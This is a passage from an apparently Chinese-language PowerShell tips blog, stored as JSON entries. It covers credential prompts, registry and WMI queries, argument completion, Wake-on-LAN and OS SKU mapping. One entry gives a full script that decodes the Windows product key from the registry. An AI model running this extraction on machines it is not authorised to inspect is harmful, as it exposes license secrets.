Get-Credential 或提示您输入用户名和密码时，Windows PowerShell （powershell.exe） 始终会打开一个单独的凭据对话框。而新的 PowerShell 7 (pwsh.exe) 则在控制台内提示： 1234567891011PS&gt; Get-CredentialPowerShell credential requestEnter your credentials.User: TobiasPassword for user Tobias: ******UserName Password-------- --------Tobias System.Security.SecureString 如果您更喜欢控制台提示而不是打开单独的对话框，则可以切换 Windows PowerShell 的默认行为。您需要管理员特权才能更改注册表设置： 12$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds&quot;Set-ItemProperty -Path $key -Name ConsolePrompting -Value $true 若要恢复默认行为，请将值更改为 $false，或通过 Remove-ItemProperty 删除注册表值。","link":"/2020/05/26/prompting-for-credentials-in-console/"},{"title":"PowerShell 技能连载 - 读取操作系统详情","text":"通过读取适当的注册表值，PowerShell 可以轻松检索重要的操作系统详细信息，例如内部版本号和版本： 1234# read operating system infoGet-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' |# pick selected propertiesSelect-Object -Property CurrentBuild,CurrentVersion,ProductId, ReleaseID, UBR 不过，其中一些值使用加密格式。例如，InstallTime 注册表项只是一个非常大的整数。 1234PS&gt; $key = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'PS&gt; (Get-ItemProperty -Path $key).InstallTime132119809618946052 事实证明，这些是时间 tick 值，通过使用 [DateTime]类型及其 FromFileTime() 静态方法，您可以轻松地将时间 tick 值转换为有意义的安装日期： 123456PS&gt; $key = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'PS&gt; $ticks = (Get-ItemProperty -Path $key).InstallTimePS&gt; $date = [DateTime]::FromFileTime($ticks)PS&gt; &quot;Your OS Install Date: $date&quot;Your OS Install Date: 09/03/2019 12:42:41 您可以在遇到时间 tick 值时使用 FromFileTime()。例如，Active Directory 也以这种格式存储日期。","link":"/2020/05/28/reading-operating-system-details/"},{"title":"PowerShell 技能连载 - 解析 Windows 产品密钥（第 1 部分）","text":"有很多脚本示例，甚至还有密钥恢复工具，它们都承诺会返回完整的产品密钥，但是在许多情况下，返回的密钥不是 Windows 产品密钥。 当您使用密钥恢复工具时，通常会丢失产品密钥，因此没有简单的方法来检查密钥恢复脚本或工具返回的承诺密钥是否正确。 幸运的是，WMI 至少可以返回“部分”产品密钥。这样，您可以验证恢复的密钥是否是有效的。 SoftwareLicensingProduct WMI 类返回有关大多数 Microsoft 产品的许可状态的详细信息。下面的此行获取所有以 “Windows” 开头且许可证状态为非 0 的 Microsoft 产品的所有许可信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445PS&gt; Get-CimInstance -ClassName SoftwareLicensingProduct -Filter 'Name LIKE &quot;Windows%&quot; AND LicenseStatus&gt;0'ADActivationCsvlkPid :ADActivationCsvlkSkuId :ADActivationObjectDN :ADActivationObjectName :ApplicationID : 55c92734-d682-4d71-983e-d6ec3f16059fAutomaticVMActivationHostDigitalPid2 :AutomaticVMActivationHostMachineName :AutomaticVMActivationLastActivationTime : 01.01.1601 01:00:00Description : Windows(R) Operating System, OEM_DM channelDiscoveredKeyManagementServiceMachineIpAddress :DiscoveredKeyManagementServiceMachineName :DiscoveredKeyManagementServiceMachinePort : 0EvaluationEndDate : 01.01.1601 01:00:00ExtendedGrace : 4294967295GenuineStatus : 0GracePeriodRemaining : 0IAID :ID : bd3762d7-270d-4760-8fb3-d829ca45278aIsKeyManagementServiceMachine : 0KeyManagementServiceCurrentCount : 4294967295KeyManagementServiceFailedRequests : 4294967295KeyManagementServiceLicensedRequests : 4294967295KeyManagementServiceLookupDomain :KeyManagementServiceMachine :KeyManagementServiceNonGenuineGraceRequests : 4294967295KeyManagementServiceNotificationRequests : 4294967295KeyManagementServiceOOBGraceRequests : 4294967295KeyManagementServiceOOTGraceRequests : 4294967295KeyManagementServicePort : 0KeyManagementServiceProductKeyID :KeyManagementServiceTotalRequests : 4294967295KeyManagementServiceUnlicensedRequests : 4294967295LicenseDependsOn :LicenseFamily : ProfessionalLicenseIsAddon : FalseLicenseStatus : 1LicenseStatusReason : 1074066433MachineURL :Name : Windows(R), Professional editionOfflineInstallationId : 563276155667058052465840741114524545879016766601431504369777043PartialProductKey : WFG6P... 不幸的是，此调用需要很长时间才能完成。为了加快速度，请告诉 WMI 您要做什么，以便该调用不会计算您不需要的大量信息。下面的调用仅从所需实例中读取 PartialProductKey 属性，并且速度更快： 123PS&gt; Get-CimInstance -Query 'Select PartialProductKey From SoftwareLicensingProduct Where Name LIKE &quot;Windows%&quot; AND LicenseStatus&gt;0' | Select-Object -ExpandProperty PartialProductKeyWFG6P","link":"/2020/06/01/decoding-windows-product-key-part-1/"},{"title":"PowerShell 技能连载 - 解析 Windows 产品密钥（第 2 部分）","text":"在上一个技能中，我们解释了如何向 WMI 请求 Windows 的部分产品密钥。如果您丢失了原始产品密钥，可以通过以下方法恢复完整密钥： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function Get-WindowsProductKey{ \\# test whether this is Windows 7 or older function Test-Win7 { $OSVersion = [System.Environment]::OSVersion.Version ($OSVersion.Major -eq 6 -and $OSVersion.Minor -lt 2) -or $OSVersion.Major -le 6 } \\# implement decoder $code = @'// original implementation: https://github.com/mrpeardotnet/WinProdKeyFinderusing System;using System.Collections; public static class Decoder { public static string DecodeProductKeyWin7(byte[] digitalProductId) { const int keyStartIndex = 52; const int keyEndIndex = keyStartIndex + 15; var digits = new[] { 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9', }; const int decodeLength = 29; const int decodeStringLength = 15; var decodedChars = new char[decodeLength]; var hexPid = new ArrayList(); for (var i = keyStartIndex; i &lt;= keyEndIndex; i++) { hexPid.Add(digitalProductId[i]); } for (var i = decodeLength - 1; i &gt;= 0; i--) { // Every sixth char is a separator. if ((i + 1) % 6 == 0) { decodedChars[i] = '-'; } else { // Do the actual decoding. var digitMapIndex = 0; for (var j = decodeStringLength - 1; j &gt;= 0; j--) { var byteValue = (digitMapIndex &lt;&lt; 8) | (byte)hexPid[j]; hexPid[j] = (byte)(byteValue / 24); digitMapIndex = byteValue % 24; decodedChars[i] = digits[digitMapIndex]; } } } return new string(decodedChars); } public static string DecodeProductKey(byte[] digitalProductId) { var key = String.Empty; const int keyOffset = 52; var isWin8 = (byte)((digitalProductId[66] / 6) &amp; 1); digitalProductId[66] = (byte)((digitalProductId[66] &amp; 0xf7) | (isWin8 &amp; 2) * 4); const string digits = &quot;BCDFGHJKMPQRTVWXY2346789&quot;; var last = 0; for (var i = 24; i &gt;= 0; i--) { var current = 0; for (var j = 14; j &gt;= 0; j--) { current = current*256; current = digitalProductId[j + keyOffset] + current; digitalProductId[j + keyOffset] = (byte)(current/24); current = current%24; last = current; } key = digits[current] + key; } var keypart1 = key.Substring(1, last); var keypart2 = key.Substring(last + 1, key.Length - (last + 1)); key = keypart1 + &quot;N&quot; + keypart2; for (var i = 5; i &lt; key.Length; i += 6) { key = key.Insert(i, &quot;-&quot;); } return key; } }'@ \\# compile C# Add-Type -TypeDefinition $code \\# get raw product key $digitalId = (Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name DigitalProductId).DigitalProductId $isWin7 = Test-Win7 if ($isWin7) { \\# use static C# method [Decoder]::DecodeProductKeyWin7($digitalId) } else { \\# use static C# method: [Decoder]::DecodeProductKey($digitalId) }}","link":"/2020/06/03/decoding-windows-product-key-part-2/"},{"title":"PowerShell 技能连载 - 添加参数自动完成（第 1 部分）","text":"在 PowerShell 函数参数中添加参数完成功能可以极大地提高函数的可用性。一种常见的方法是将 [ValidateSet()] 属性添加到您的参数中： 12345678910111213function Get-Country{ param ( # suggest country names [ValidateSet('USA','Germany','Norway','Sweden','Austria','YouNameIt')] [string] $Name ) # return parameter $PSBoundParameters} 现在，当用户使用 Get-Country 命令并传入 -Name 参数时，该函数现在会在用户按下 TAB 时建议国家/地区名称。像 PowerShell ISE 或 Visual Studio Code 这样的复杂PowerShell 编辑器甚至会自动打开 IntelliSense 菜单，或者在您按 CTRL + SPACE 显示所有的值。 但是，[ValidateSet()] 属性将用户限制为列出的值。无法输入其他值。如果只想为 -ComputerName 参数建议最常用的服务器名称，则将用户限制为仅使用这些服务器名称。这不是一个好主意。 从 PowerShell 7 开始，有一个名为 [ArgumentCompletions()] 的新属性，该属性几乎与 [ValidateSet()] 相似，但它跳过了验证部分。它提供相同的参数补全，但不限制用户输入： 12345678910111213function Get-Country{ param ( # suggest country names [ArgumentCompletions('USA','Germany','Norway','Sweden','Austria','YouNameIt')] [string] $Name ) # return parameter $PSBoundParameters} 此版本的 Get-Country 提供国家名称建议，但是如果您愿意，您仍然可以输入其他任何国家名称。 重要提示：由于 PowerShell 中的错误，参数自动完成对于定义具体功能的脚本窗格不起作用。而在 PowerShell 控制台和任何其他编辑器脚本窗格中，参数自动完成可以正常工作。 Windows PowerShell 中缺少新的 [ArgumentCompletions()] 属性，因此在使用它时，您的函数不再与 Windows PowerShell 兼容。我们将在即将到来的提示中解决此问题。","link":"/2020/06/05/adding-argument-completion-part-1/"},{"title":"PowerShell 技能连载 - 添加参数自动完成（第 2 部分）","text":"在上一个技能中，我们讨论了已添加到 PowerShell 7 新的 [ArgumentCompletions()] 属性，以及如何使用它向函数参数添加复杂的参数完成功能。 不幸的是，该属性在 Windows PowerShell 中不可用，因此使用此属性，您的代码将不再与 Windows PowerShell 兼容。 当然，您还可以将属性添加到 Windows PowerShell。当您在Windows PowerShell中运行以下代码时， [ArgumentCompletions()] 属性将变为可用。PowerShell 7 代码仍然保持兼容，现在您也可以在Windows PowerShell中开始使用此属性： 123456789101112131415161718192021222324252627# are we running in Windows PowerShell?if ($PSVersionTable.PSEdition -ne 'Core'){ # add the attribute [ArgumentCompletions()] $code = @'using System;using System.Collections.Generic;using System.Management.Automation; public class ArgumentCompletionsAttribute : ArgumentCompleterAttribute { private static ScriptBlock _createScriptBlock(params string[] completions) { string text = &quot;\\&quot;&quot; + string.Join(&quot;\\&quot;,\\&quot;&quot;, completions) + &quot;\\&quot;&quot;; string code = &quot;param($Command, $Parameter, $WordToComplete, $CommandAst, $FakeBoundParams);@(&quot; + text + &quot;) -like \\&quot;*$WordToComplete*\\&quot; | Foreach-Object { [System.Management.Automation.CompletionResult]::new($_, $_, 'ParameterValue', $_) }&quot;; return ScriptBlock.Create(code); } public ArgumentCompletionsAttribute(params string[] completions) : base(_createScriptBlock(completions)) { } }'@ $null = Add-Type -TypeDefinition $code *&gt;&amp;1} 如您所见，代码仅在 Windows PowerShell 中运行时才添加新属性。在PowerShell 7中，该属性已内置。 现在，无论您打算在 Windows PowerShell 还是Windows 7 中使用它，都可以在函数中使用复杂的参数完成。只需将上面的代码添加到代码中，以确保存在该属性。 这是使用属性并提供参数完成的函数的示例： 12345678910111213function Get-Country{ param ( # suggest country names: [ArgumentCompletions('USA','Germany','Norway','Sweden','Austria','YouNameIt')] [string] $Name ) # return parameter $PSBoundParameters} 当您在 PowerShell ISE（它是纯粹的 Windows PowerShell）中运行代码，然后在交互式控制台中使用 Get-Country 时，PowerShell ISE 会自动为 -Name 参数建议参数值（国家/地区名称）。 这里还有两件事要考虑： 由于 PowerShell 中存在长期的错误，这种类型的参数完成功能在定义实际功能的编辑器脚本窗格中不起作用。它始终可以在交互式控制台（这是最重要的用例）和任何其他脚本窗格中使用。 与 [ValidateSet()] 属性相反，新的 [ArgumentCompletions()] 属性并不将用户输入限制为列出的值。新属性仅提供您定义的建议，而不以任何方式限制用户输入。 有关此处使用的技术的更多详细信息，请访问 https://powershell.one/powershell-internals/attributes/auto-completion。","link":"/2020/06/09/adding-argument-completion-part-2/"},{"title":"PowerShell 技能连载 - 转换十六进制数据","text":"当您添加 “0x” 前缀时，PowerShell 可以交互地转换十六进制数字： 12PS&gt; 0xAB0f43791 如果十六进制数存储在字符串中，则可以通过将类型应用于表达式来调用转换： 1234PS&gt; $a = 'ab0f'PS&gt; [int]&quot;0x$a&quot;43791","link":"/2020/06/15/converting-hex-numbers/"},{"title":"PowerShell 技能连载 - 自学习参数完成","text":"对于用户而言，参数完成非常棒，因为始终建议使用有效的参数。许多内置的 PowerShell 命令带有参数完成功能。当您输入以下内容时，您可以看到该效果： 1PS&gt; Get-EventLog -LogName 在 -LogName 之后输入一个空格，以在 PowerShell ISE 编辑器中触发自动参数完成。在 PowerShell 控制台中，按 TAB 键。而在 Visual Studio Code 中，按 CTRL + SPACE。Get-EventLog 会自动建议计算机上实际存在的日志的日志名称。 您可以将相同的参数完成功能添加到自己的函数参数中。在前面的技巧中，我们解释了如何添加静态建议。现在让我们来看看如何添加自学习参数完成功能！ 假设您使用 -Co​​mputerName 参数编写 PowerShell 函数。为了使您的函数更易于使用，请添加参数完成，以便自动向用户建议计算机名称和 IP 地址。 显然，您无法知道对用户很重要的计算机名称和IP地址，因此您无法添加静态列表。而是使用两个自定义属性： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# define [AutoLearn()]class AutoLearnAttribute : System.Management.Automation.ArgumentTransformationAttribute{ # define path to store hint lists [string]$Path = &quot;$env:temp\\hints&quot; # define ID to manage multiple hint lists [string]$Id = 'default' # define prefix character used to delete the hint list [char]$ClearKey = '!' # define parameterless constructor AutoLearnAttribute() : base() {} # define constructor with parameter for ID AutoLearnAttribute([string]$Id) : base() { $this.Id = $Id } # Transform() is called whenever there is a variable or parameter assignment, # and returns the value that is actually assigned [object] Transform([System.Management.Automation.EngineIntrinsics]$engineIntrinsics, [object] $inputData) { # make sure the folder with hints exists $exists = Test-Path -Path $this.Path if (!$exists) { $null = New-Item -Path $this.Path -ItemType Directory } # create a filename for hint list $filename = '{0}.hint' -f $this.Id $hintPath = Join-Path -Path $this.Path -ChildPath $filename # use a hash table to keep hint list $hints = @{} # read hint list if it exists $exists = Test-Path -Path $hintPath if ($exists) { Get-Content -Path $hintPath -Encoding Default | # remove leading and trailing blanks ForEach-Object { $_.Trim() } | # remove empty lines Where-Object { ![string]::IsNullOrEmpty($_) } | # add to hash table ForEach-Object { # value is not used, set it to $true $hints[$_] = $true } } # does the user input start with the clearing key? if ($inputData.StartsWith($this.ClearKey)) { # remove the prefix $inputData = $inputData.SubString(1) # clear the hint list $hints.Clear() } # add new value to hint list if(![string]::IsNullOrWhiteSpace($inputData)) { $hints[$inputData] = $true } # save hints list $hints.Keys | Sort-Object | Set-Content -Path $hintPath -Encoding Default # return the user input (if there was a clearing key at its start, # it is now stripped) return $inputData }}# define [AutoComplete()]class AutoCompleteAttribute : System.Management.Automation.ArgumentCompleterAttribute{ # define path to store hint lists [string]$Path = &quot;$env:temp\\hints&quot; # define ID to manage multiple hint lists [string]$Id = 'default' # define parameterless constructor AutoCompleteAttribute() : base([AutoCompleteAttribute]::_createScriptBlock($this)) {} # define constructor with parameter for ID AutoCompleteAttribute([string]$Id) : base([AutoCompleteAttribute]::_createScriptBlock($this)) { $this.Id = $Id } # create a static helper method that creates the script block that the base constructor needs # this is necessary to be able to access the argument(s) submitted to the constructor # the method needs a reference to the object instance to (later) access its optional parameters hidden static [ScriptBlock] _createScriptBlock([AutoCompleteAttribute] $instance) { $scriptblock = { # receive information about current state param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters) # create filename for hint list $filename = '{0}.hint' -f $instance.Id $hintPath = Join-Path -Path $instance.Path -ChildPath $filename # use a hash table to keep hint list $hints = @{} # read hint list if it exists $exists = Test-Path -Path $hintPath if ($exists) { Get-Content -Path $hintPath -Encoding Default | # remove leading and trailing blanks ForEach-Object { $_.Trim() } | # remove empty lines Where-Object { ![string]::IsNullOrEmpty($_) } | # filter completion items based on existing text Where-Object { $_.LogName -like &quot;$wordToComplete*&quot; } | # create argument completion results Foreach-Object { [System.Management.Automation.CompletionResult]::new($_, $_, 'ParameterValue', $_) } } }.GetNewClosure() return $scriptblock }} 这就是您想要为自己的 PowerShell 函数添加尽可能多的自学习自动完成功能所需要的全部。 这是一个利用这两个属性的新的 PowerShell 函数： 1234567891011121314151617181920212223function Connect-MyServer{ param ( [string] [Parameter(Mandatory)] # auto-learn user names to user.hint [AutoLearn('user')] # auto-complete user names from user.hint [AutoComplete('user')] $UserName, [string] [Parameter(Mandatory)] # auto-learn computer names to server.hint [AutoLearn('server')] # auto-complete computer names from server.hint [AutoComplete('server')] $ComputerName ) &quot;Hello $Username, connecting you to $ComputerName&quot;} 运行代码后，会产生一个新的 Connect-MyServer 命令。-UserName 和 -ComputerName 参数均提供自学习自动补全功能：每当您为这些参数之一分配值时，该参数都会“记住”该参数，并在下次向您建议记住的值。 首次调用 Connect-MyServer 时，没有参数完成。再次调用它时，系统会建议您以前的输入，并且随着时间的推移，您的函数会“学习”对用户重要的参数。 这两个参数使用独立的建议。只需确保在两个属性中都为建议列表提供名称即可。在上面的示例中，-UserName 参数使用 “user” 建议列表，而 -ComputerName 参数使用 “server” 建议列表。 如果要清除有关参数的建议，请在参数前添加一个感叹号。该调用将清除 -ComputerName 参数的建议： 12PS&gt; Connect-MyServer -UserName tobias -ComputerName !server12Hello tobias, connecting you to server12 重要说明：由于 PowerShell 中存在一个长期存在的错误，参数定义完成在定义实际功能的编辑器脚本窗格中不起作用。它始终可以在交互式控制台（这是最重要的用例）和任何其他脚本窗格中使用。 有关此处使用的技术的更多详细信息，请访问 https://powershell.one/powershell-internals/attributes/custom-attributes。","link":"/2020/06/11/auto-learning-argument-completion/"},{"title":"PowerShell 技能连载 - 局域网唤醒","text":"无需外部“局域网唤醒”工具了。如果要唤醒网络计算机，只需告诉 PowerShell 目标计算机的 MAC 地址即可。这是一个组成 magic packet 并唤醒机器的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function Invoke-WakeOnLan{ param ( # one or more MAC addresses [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] # MAC address must be a following this regex pattern [ValidatePattern('^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$')] [string[]] $MacAddress ) begin { # instantiate a UDP client $UDPclient = [System.Net.Sockets.UdpClient]::new() } process { foreach ($_ in $MacAddress) { try { $currentMacAddress = $_ # get byte array from MAC address $mac = $currentMacAddress -split '[:-]' | # convert the hex number into byte ForEach-Object { [System.Convert]::ToByte($_, 16) } #region compose the &quot;magic packet&quot; # create a byte array with 102 bytes initialized to 255 each $packet = [byte[]](,0xFF * 102) # leave the first 6 bytes untouched, and # repeat the target MAC address bytes in bytes 7 through 102 6..101 | ForEach-Object { # $_ is indexing in the byte array, # $_ % 6 produces repeating indices between 0 and 5 # (modulo operator) $packet[$_] = $mac[($_ % 6)] } #endregion # connect to port 4000 on broadcast address $UDPclient.Connect(([System.Net.IPAddress]::Broadcast),4000) # send the magic packet to the broadcast address $null = $UDPclient.Send($packet, $packet.Length) Write-Verbose &quot;Sent magic packet to $currentMacAddress...&quot; } catch { Write-Warning &quot;Unable to send ${mac}: $_&quot; } } } end { # release the UDP client and free its memory $UDPclient.Close() $UDPclient.Dispose() }} 运行该函数后，可以通过以下方法唤醒计算机： 1Invoke-WakeOnLan -MacAddress '24:EE:9A:54:1B:E5', '98:E7:43:B5:B2:2F' -Verbose 要找出目标机器的MAC地址，请在目标机器上运行此行代码或通过远程处理： 1Get-CimInstance -Query 'Select * From Win32_NetworkAdapter Where NetConnectionStatus=2' | Select-Object -Property Name, Manufacturer, MacAddress 可以在这里找到更多信息：https://powershell.one/code/11.html。","link":"/2020/06/17/wake-on-lan/"},{"title":"PowerShell 技能连载 - 使用断言","text":"通常，您的代码需要声明某些先决条件。例如，您可能要确保给定的文件夹存在，并使用如下代码： 1234567891011# path to download files to$OutPath = &quot;$env:temp\\SampleData&quot;# does it already exist?$exists = Test-Path -Path $OutPath -PathType Container# no, create itif (!$exists){ $null = New-Item -Path $OutPath -ItemType Directory} 您可以开始使用断言函数库，而不必一遍又一遍地写代码。这是确保文件夹存在的一种： 12345678filter Assert-FolderExists{ $exists = Test-Path -Path $_ -PathType Container if (!$exists) { Write-Warning &quot;$_ did not exist. Folder created.&quot; $null = New-Item -Path $_ -ItemType Directory }} 使用此函数，您的代码将变得更加整洁。这些代码将文件夹路径分配给变量，并同时确保文件夹存在： 12345# making sure a bunch of folders exist'C:\\test1', 'C:\\test2' | Assert-FolderExists# making sure the path assigned to a variable exists($Path = 'c:\\test3') | Assert-FolderExists 在此处阅读有关此技术的更多信息：https://powershell.one/code/10.html。","link":"/2020/06/19/using-assertions/"},{"title":"PowerShell 技能连载 - 移除空白的属性","text":"WMI 和 Get-CimInstance 可以为您提供许多有用的信息，但是返回的对象通常包含许多空属性： 1PS&gt; Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property * 另外，属性不一定要排序。您可以通过识别和排序不为空的属性来进行修复： 123456# get all WMI information$os = Get-CimInstance -ClassName Win32_OperatingSystem# find names of non-empty properties$filledProperties = $os.PSObject.Properties.Name.Where{![string]::IsNullOrWhiteSpace($os.$_)} | Sort-Object# show non-empty properties only$os | Select-Object -Property $filledProperties","link":"/2020/06/23/removing-empty-properties/"},{"title":"PowerShell 技能连载 - 在网格视图窗口中将对象数据显示为表格","text":"通常，当将单个对象输出到 Out-GridView 时，将得到一行数据，并且每个属性都以一列的形式出现： 1Get-ComputerInfo | Select-Object -Property * | Out-GridView 这样难以查看和过滤特定信息。只需将对象转换为有序哈希表，即可将其显示为网格视图窗口中的表。此外，您现在还可以消除空属性并确保对属性进行排序： 123456# make sure you have exactly ONE object$info = Get-ComputerInfo# find names of non-empty properties$filledProperties = $info.PSObject.Properties.Name.Where{![string]::IsNullOrWhiteSpace($info.$_)} | Sort-Object# turn object into a hash table and show in a grid view window$filledProperties | ForEach-Object { $hash = [Ordered]@{} } { $hash[$_] = $info.$_ } { $hash } | Out-GridView 只要 $info 恰好包含一个对象，该方法就可以完美地工作。例如，您可以调整代码，并使用 “Get-AdUser -Identify SomeName -Properties *“ 代替 “Get-ComputerInfo“ 来列出给定用户的所有 Active Directory 属性。只要确保您精确地指定了一个用户即可。 由于此方法将对象转换为键值对，因此不适用于多个对象。","link":"/2020/06/25/showing-object-data-as-table-in-a-grid-view-window/"},{"title":"PowerShell 技能连载 - 改变操作系统描述","text":"每个 Windows 操作系统都有一个描述，您可以使用以下命令查看（和更改）该描述： 1PS&gt; control sysdm.cpl 要通过 PowerShell 自动执行此操作，请使用以下命令： 12345678910111213# change operating system description# (requires admin privileges)$values = @{ Description = 'My Computer'}Set-CimInstance -Query 'Select * from Win32_OperatingSystem' -Property $values# read description# (no admin privileges required)$description = Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty Description&quot;OS Description: $description&quot;","link":"/2020/06/29/changing-operating-system-description/"},{"title":"PowerShell 技能连载 - 操作系统的启动和安装时间","text":"WMI 类 Win32_OperatingSystem 提供了有关许多日期时间信息的丰富信息，包括上次启动的日期和安装时间： 123$dateTimeProps = 'InstallDate', 'LastBootupTime', 'LocalDateTime', 'CurrentTimeZone', 'CountryCode'Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property $dateTimeProps 结果看起来像这样： InstallDate : 03.09.2019 12:42:41 LastBootupTime : 03.05.2020 12:15:45 LocalDateTime : 04.05.2020 10:43:55 CurrentTimeZone : 120 CountryCode : 49 如果您想知道系统运行了多少分钟，或者自安装以来已经过去了几天，请使用 New-TimeSpan： 1234567$os = Get-CimInstance -ClassName Win32_OperatingSystem$installedDays = (New-TimeSpan -Start $os.InstallDate).Days$runningMinutes = [int](New-TimeSpan -Start $os.LastBootupTime).TotalMinutes&quot;Your copy of Windows was installed $installedDays days ago.&quot;&quot;Your system is up for {0:n0} minutes.&quot; -f $runningMinutes 结果看起来像这样： Your copy of Windows was installed 243 days ago. Your system is up for 1.353 minutes. Get-CimInstance cmdlet可用于在本地和远程计算机上查询信息（前提是您具有适当的权限）。有关如何远程使用Get-CimInstance的更多信息，请访问https://powershell.one/wmi/remote-access。","link":"/2020/07/01/boot-and-install-time-for-operating-system/"},{"title":"PowerShell 技能连载 - 识别 Windows 类型","text":"WMI 返回每个不同的 Windows SKU 的密码编号： 12PS&gt; Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty OperatingSystemSKU48 要将此数字转换为有意义的文本（例如出于报告目的），请尝试以下操作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165$OperatingSystemSKU = @{ Name = 'OperatingSystemSKUText' Expression = { $value = $_.OperatingSystemSKU switch([int]$value) { 0 {'PRODUCT_UNDEFINED'} 1 {'PRODUCT_ULTIMATE'} 2 {'PRODUCT_HOME_BASIC'} 3 {'PRODUCT_HOME_PREMIUM'} 4 {'PRODUCT_ENTERPRISE'} 5 {'PRODUCT_HOME_BASIC_N'} 6 {'PRODUCT_BUSINESS'} 7 {'PRODUCT_STANDARD_SERVER'} 8 {'PRODUCT_DATACENTER_SERVER'} 9 {'PRODUCT_SMALLBUSINESS_SERVER'} 10 {'PRODUCT_ENTERPRISE_SERVER'} 11 {'PRODUCT_STARTER'} 12 {'PRODUCT_DATACENTER_SERVER_CORE'} 13 {'PRODUCT_STANDARD_SERVER_CORE'} 14 {'PRODUCT_ENTERPRISE_SERVER_CORE'} 15 {'PRODUCT_ENTERPRISE_SERVER_IA64'} 16 {'PRODUCT_BUSINESS_N'} 17 {'PRODUCT_WEB_SERVER'} 18 {'PRODUCT_CLUSTER_SERVER'} 19 {'PRODUCT_HOME_SERVER'} 20 {'PRODUCT_STORAGE_EXPRESS_SERVER'} 21 {'PRODUCT_STORAGE_STANDARD_SERVER'} 22 {'PRODUCT_STORAGE_WORKGROUP_SERVER'} 23 {'PRODUCT_STORAGE_ENTERPRISE_SERVER'} 24 {'PRODUCT_SERVER_FOR_SMALLBUSINESS'} 25 {'PRODUCT_SMALLBUSINESS_SERVER_PREMIUM'} 26 {'PRODUCT_HOME_PREMIUM_N'} 27 {'PRODUCT_ENTERPRISE_N'} 28 {'PRODUCT_ULTIMATE_N'} 29 {'PRODUCT_WEB_SERVER_CORE'} 30 {'PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT'} 31 {'PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY'} 32 {'PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING'} 33 {'PRODUCT_SERVER_FOUNDATION'} 34 {'PRODUCT_HOME_PREMIUM_SERVER'} 35 {'PRODUCT_SERVER_FOR_SMALLBUSINESS_V'} 36 {'PRODUCT_STANDARD_SERVER_V'} 37 {'PRODUCT_DATACENTER_SERVER_V'} 38 {'PRODUCT_ENTERPRISE_SERVER_V'} 39 {'PRODUCT_DATACENTER_SERVER_CORE_V'} 40 {'PRODUCT_STANDARD_SERVER_CORE_V'} 41 {'PRODUCT_ENTERPRISE_SERVER_CORE_V'} 42 {'PRODUCT_HYPERV'} 43 {'PRODUCT_STORAGE_EXPRESS_SERVER_CORE'} 44 {'PRODUCT_STORAGE_STANDARD_SERVER_CORE'} 45 {'PRODUCT_STORAGE_WORKGROUP_SERVER_CORE'} 46 {'PRODUCT_STORAGE_ENTERPRISE_SERVER_CORE'} 47 {'PRODUCT_STARTER_N'} 48 {'PRODUCT_PROFESSIONAL'} 49 {'PRODUCT_PROFESSIONAL_N'} 50 {'PRODUCT_SB_SOLUTION_SERVER'} 51 {'PRODUCT_SERVER_FOR_SB_SOLUTIONS'} 52 {'PRODUCT_STANDARD_SERVER_SOLUTIONS'} 53 {'PRODUCT_STANDARD_SERVER_SOLUTIONS_CORE'} 54 {'PRODUCT_SB_SOLUTION_SERVER_EM'} 55 {'PRODUCT_SERVER_FOR_SB_SOLUTIONS_EM'} 56 {'PRODUCT_SOLUTION_EMBEDDEDSERVER'} 57 {'PRODUCT_SOLUTION_EMBEDDEDSERVER_CORE'} 58 {'PRODUCT_PROFESSIONAL_EMBEDDED'} 59 {'PRODUCT_ESSENTIALBUSINESS_SERVER_MGMT'} 60 {'PRODUCT_ESSENTIALBUSINESS_SERVER_ADDL'} 61 {'PRODUCT_ESSENTIALBUSINESS_SERVER_MGMTSVC'} 62 {'PRODUCT_ESSENTIALBUSINESS_SERVER_ADDLSVC'} 63 {'PRODUCT_SMALLBUSINESS_SERVER_PREMIUM_CORE'} 64 {'PRODUCT_CLUSTER_SERVER_V'} 65 {'PRODUCT_EMBEDDED'} 66 {'PRODUCT_STARTER_E'} 67 {'PRODUCT_HOME_BASIC_E'} 68 {'PRODUCT_HOME_PREMIUM_E'} 69 {'PRODUCT_PROFESSIONAL_E'} 70 {'PRODUCT_ENTERPRISE_E'} 71 {'PRODUCT_ULTIMATE_E'} 72 {'PRODUCT_ENTERPRISE_EVALUATION'} 76 {'PRODUCT_MULTIPOINT_STANDARD_SERVER'} 77 {'PRODUCT_MULTIPOINT_PREMIUM_SERVER'} 79 {'PRODUCT_STANDARD_EVALUATION_SERVER'} 80 {'PRODUCT_DATACENTER_EVALUATION_SERVER'} 84 {'PRODUCT_ENTERPRISE_N_EVALUATION'} 85 {'PRODUCT_EMBEDDED_AUTOMOTIVE'} 86 {'PRODUCT_EMBEDDED_INDUSTRY_A'} 87 